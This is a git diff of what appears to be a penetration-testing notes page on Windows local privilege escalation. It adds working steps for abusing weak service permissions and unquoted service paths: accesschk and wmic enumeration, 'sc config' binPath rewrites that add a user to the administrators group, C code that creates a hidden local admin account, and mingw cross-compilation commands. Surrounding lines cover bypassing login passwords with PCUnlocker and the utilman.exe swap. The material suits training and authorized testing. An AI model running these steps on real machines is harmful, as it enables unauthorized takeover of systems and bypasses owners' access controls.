@@ -77,7 +77,8 @@ passwords is as follow:
 
   1. Download Rufus and PCUnlocker
   2. Create a bootable USK key using Rufus with the PCUnlocker ISO.  
-     If making an USB key for a computer with UEFI BIOS, pick the "GPT partition scheme for UEFI computer" option on Rufus
+     If making an USB key for a computer with UEFI BIOS, pick the "GPT partition
+     scheme for UEFI computer" option on Rufus
   3. Boot on the USB Key thus created (boot order may need to be changed in BIOS)
   4. From the PCUnlocker GUI, pick an account and click the "Reset Password"
      button to reset the password to "Password123"
@@ -100,7 +101,8 @@ The procedure to do so is as follow:
      to a CD/DVD
   2. Boot on the thus created CD/DVD
   3. Pick the "Repair your computer" option
-  4. Select the “Use recovery tools [...]" option, pick the operating system from the list and click "Next"
+  4. Select the “Use recovery tools [...]" option, pick the operating system from the
+   list and click "Next"
   5. A command prompt should open, enter the following commands:
       - cd windows\system32
       - ren utilman.exe utilman.exe.bak
@@ -300,27 +302,81 @@ Ubiquiti UniFi Video
 
 ###### Weak services permissions
 
+A weak service permissions vulnerability occurs when an unprivileged user can
+alter the service binary so that the service runs a specified command or executable.  
+
+The accesschk tool, from the Sysinternals suite, can be used to list the services an
+user can modify:
+
+```
+accesschk.exe -accepteula -uwcqv <USERNAME> *
+
+# Shows which services can be altered by everyone
+accesschk.exe -uwcqv "Everyone" *
+
+# Shows groups which can alter the service
+accesschk.exe -accepteula -uwcqv *
+```
+
+The exploitable permissions are:
+
+```
+SERVICE_CHANGE_CONFIG
+SERVICE_ALL_ACCESS F
+GENERIC_WRITE / GW
+GENERIC_ALL / GA
+WRITE_DAC / WDAC
+WRITE_OWNER / WO
+```
+
+To alter the service configuration:
+
+```
+sc config <SERVICENAME> binPath=net localgroup administrators <USERNAME> /add
+sc config <SERVICENAME> binPath=<NEWBINPATH>
+```
+
 ###### Unquoted services path
 
 When a service path is unquoted, the Service Manager will try to find the
 service binary in the shortest path, moving up to the longest path until one
 works.     
-For example, in the case of the path C:\Service Folder\Service.exe, the space
+For example, for the path C:\Service Folder\Service_binary.exe, the space
 is treated as an optional path to explore for that service. The resolution
-process will first look into C:\Service for the Service.exe binary and, if it
-exist, use to start the service.    
-In summary, a service is vulnerable if the path to the executable has a space
-in the filename and the file name is not wrapped in quote marks; exploitation
-requires write permissions to the path before the quote mark. If a service is
-vulnerable, it can be leveraged to escalate privileges to the level of the
-account that starts the service.  
+process will first look into C:\ for the Service.exe binary and, if it
+exist, use it to start the service.  
 
-To find vulnerable services the PowerUp script the
+Here is Windows’ chain of thought for the above example:
+
+1. Are they asking me to run  
+   "C:\Service.exe" Folder\Service_binary.exe  
+   No, it does not exist.
+
+2. Are they asking me to run  
+   "C:\Service Folder\Service_binary.exe"  
+   Yes, it does exist.
+
+In summary, a service is vulnerable if the path to the executable contains spaces
+and the path is not wrapped in quote marks ; exploitation
+requires write permissions to the path before the quote mark.
+
+In the example, if an attacker has write privilege in C:\, he could create a
+C:\Service.exe and escalate its privileges to the level of the account that starts the
+service.  
+
+To find vulnerable services the wmic tool, the PowerUp script and the
 exploit/windows/local/trusted_service_path metasploit module can be used as
-well the following commands:
+well as a manual review of each service metadata using sc queries:
 
 ```
+# List services
+sc query
+# Specified service metadata
+sc qc <SERVICENAME>
+
 # wmic
+wmic service get PathName, StartMode | findstr /i /v """
+wmic service get PathName, StartMode | findstr /i /v "C:\\Windows\\" | findstr /i /v """
 wmic service get name.pathname,startmode | findstr /i /v """
 wmic service get name.pathname,startmode | findstr /i /v """ | findstr /i /v "C:\\Windows\\"
 
@@ -333,11 +389,44 @@ Get-ServiceUnquoted
 exploit/windows/local/trusted_service_path
 ```
 
-###### Update and restart service
 
-To modifiy a service binary:
 
-To restart a service:
+###### Exploit and restart service
+
+*Add a local administrator user*
+
+The following C code can be used to add a local administrator user:
+
+```
+#include <stdlib.h>
+
+
+int main() {
+  int i;
+  i = system("net user TMP_Account <PASSWORD> /add")
+  i = system("net localgroup administrators TMP_Account /add")
+  return 0;
+}
+```
+
+The C code above can be compiled on Linux using the  cross-compiler mingw:
+
+```
+# 32 bits
+i686-w64-mingw32-gcc -o test.exe test.c
+
+# 64 bits
+x86_64-w64-mingw32-gcc -o test.exe test.c
+```
+
+*Reverse shell*
+
+The service can be leveraged to start a privileged reverse shell. Refer to the
+General/Shells page (# Binary).  
+
+*Service restart*
+
+To restart the service:
 
 ```
 # Stop
@@ -348,7 +437,6 @@ Stop-Service -Name <SERVICE> -Force
 net start <SERVICE>
 Start-Service -Name <SERVICE>
 ```
-
 
 
 #### AlwaysInstallElevated
